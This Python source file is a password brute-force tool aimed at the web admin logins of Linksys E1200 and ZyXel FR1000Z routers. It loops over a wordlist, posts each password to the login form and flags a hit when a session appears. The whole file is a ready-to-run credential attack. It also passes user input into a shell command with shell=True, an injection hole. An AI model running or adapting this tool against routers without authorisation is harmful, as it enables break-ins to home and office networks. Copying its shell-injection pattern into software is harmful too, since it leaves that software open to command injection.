#router_brute.py
#brute force password program for web router logins in python
#Built by Michael Lockette, Lockette Down Security LLC

'''
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
'''

import httplib2
import urllib
import urllib2
import os
import optparse
import subprocess

parser = optparse.OptionParser(version='Version 1.0')

parser.add_option("-v", "--verbose",
	action= "store_true", dest="verbose", default=False,
	help="step by step information of brute force[default]")
parser.add_option("-u", "--user", action="store",
	default="admin", help="Single user name for brute force attempt(s)[default is admin]")
parser.add_option("-p", "--password", action="store",
	help="Single password for brute froce attempt(s)")
parser.add_option("-P", "--passlist", action="store", 
	help="File location for multiple password attacks on target")
parser.add_option("-t", "--target", action="store", default="http://192.168.1.1/login.cgi",
	help="Target IP adesses/URL for Post http attacks ex: http://192.168.0.1/login.cgi")
parser.add_option("-r", "--router", action="store", default="Linksys E1200", 
	help="The name of the target router, currently supported are:" +
	" Linksys E1200 [Default], ZyXel FR1000Z")
parser.add_option("-a", "--user-agent", action="store", 
	default="Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.1",
	help="HTTP post message user-agent value in victim attack. Default is: " +
	"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.1")

(options, args) = parser.parse_args()

#This will be my default method of printing verbosive messages... not very clean IMO

if options.verbose:
	print("The prgram will now execute in verbose...")
	print("The router victim is ", options.router)

#pasword and password list chaeck steps...
if options.passlist and options.password:
	sys.exit("Can not provide both password and password file at this time.  please try again...")
elif options.passlist:
	print ("The File location for password list is: ", options.passlist)
elif options.password:
	print("The password value is: ", options.password)
else:
	sys.exit("No password or Password List was provided.  please try again...")


def RSA_MD5_Linksys_hash(clear_text_pw):
	##First step take user clear text password and return MD5 hash in the js file.
	#output_hash = subprocess.Popen("rhino RSA_encryption_linksys.js LocketteNet", shell=True, stdout=subprocess.PIPE).stdout
	#print(output_hash)

	cmd_text = "rhino RSA_encryption_linksys.js " + clear_text_pw
	if options.verbose:
		print ('Execute javascript MD5 hash: ', cmd_text)

	piper = subprocess.Popen(cmd_text, shell=True, stdout=subprocess.PIPE).stdout
	output_hash = piper.read().rstrip()

	if options.verbose:
		print('This should be my hash ', output_hash)

	return output_hash


def attack_run_linksys(prepared_pw):
	
	post_data = {'submit_button':'login', 'change_action':'&action','wait_time':'19',
		'http_username':options.user, 'http_passwd':prepared_pw}
	body = urllib.urlencode(post_data)
	if options.verbose:
		print(body)


	h = httplib2.Http()

	url = options.target

	headers = {'user-agent':options.user_agent,
		'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		'Content-Type':'application/x-www-form-urlencoded'}
	if options.verbose:
		print(headers)

	if options.verbose:
		print("action happens...")

	resp, content = h.request(url, method="POST", headers=headers, body=body)
	if options.verbose:
		print(resp)

	return (resp, content)

def attack_run_ZyXel(prepared_pw):
	
	post_data = {'admin_username':options.user, 'admin_password':prepared_pw}
	body = urllib.urlencode(post_data)
	if options.verbose:
		print(body)


	h = httplib2.Http()

	url = options.target

	headers = {'user-agent':options.user_agent,
		'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		'Content-Type':'application/x-www-form-urlencoded'}
	if options.verbose:
		print(headers)

	if options.verbose:
		print("action happens...")

	resp, content = h.request(url, method="POST", headers=headers, body=body)
	if options.verbose:
		print(resp)

	return (resp, content, prepared_pw)

def analysis_linksys_attack(http_response):

	#No longer need to print.  however need to read contents to see if there is a session_id inside!!!
	#print(content)
	if "session_id" in http_response[1]:

		'''We can get back to this at a later point.  not really neccesary at this time...
		session_line = [line for line in content.split('\n') if "session_id" in line]
		print(session_line)
		regex = re.compile('session_id=*/')
		session_regex = [string for string in session_line if re.match(regex, string)]
		print("is this better? ", session_regex)
		'''
		message_return = "Found session id!!!, valid clear text password is "
		#print("Found session id!!!, valid clear text password is ", options.password)
		return message_return
	else:
		message_return = "No session_id"
		#print("No session_id")
		return message_return

def analysis_ZyXel_attack(http_response):
	'''
	print("resp is....  ")
	print(http_response[0])
	print("content is...  ")
	print(http_response[1])
	'''

	if "Login Failed" in http_response[1]:
		message_return = "No session given, Login Failed"
		return message_return
	else:
		message_return = "Found Session!!!, valid clear text password is " + http_response[2]
		return message_return



#this is my main so to speak....
#need to break down into different router type attacks...

if options.router is "Linksys E1200":
	#these below are for the linksys E1200 w/MD5 hash, http post
	if options.password:
		if options.verbose:
			print("Going into single attack run!!")
		hash_pass = RSA_MD5_Linksys_hash(options.password);
		http_response = attack_run_linksys(hash_pass);
		run_result = analysis_linksys_attack(http_response);
		print run_result + options.password

	elif options.passlist:
		#will execute loop
		#print("password file execution is in development....")

		with open(options.passlist, 'r') as passlist_file:
			for line in passlist_file:
				attempt_pw = line.rstrip()
				print ("pw try is: ", attempt_pw)
				hash_pass = RSA_MD5_Linksys_hash(attempt_pw);
				http_response = attack_run_linksys(hash_pass);
				run_result = analysis_linksys_attack(http_response);
				if 'Found' in run_result:
					print(run_result + attempt_pw) 
					break

elif 'ZyXel FR1000Z' in options.router:
	print("Attack on ZyXel router initiated")
	#these below are for the ZyXel FR1000Z w/http post
	if options.password:
		print("Single pw attack on ZyXel router initiated")
		if options.verbose:
			print("Going into single attack run!!")
		http_response = attack_run_ZyXel(options.password);
		run_result = analysis_ZyXel_attack(http_response);
		print run_result
	elif options.passlist:
		with open(options.passlist, 'r') as passlist_file:
			for line in passlist_file:
				attempt_pw = line.rstrip()
				print ("pw try is: ", attempt_pw)
				http_response = attack_run_ZyXel(attempt_pw);
				run_result = analysis_ZyXel_attack(http_response);
				if 'Found' in run_result:
					print(run_result)
					break

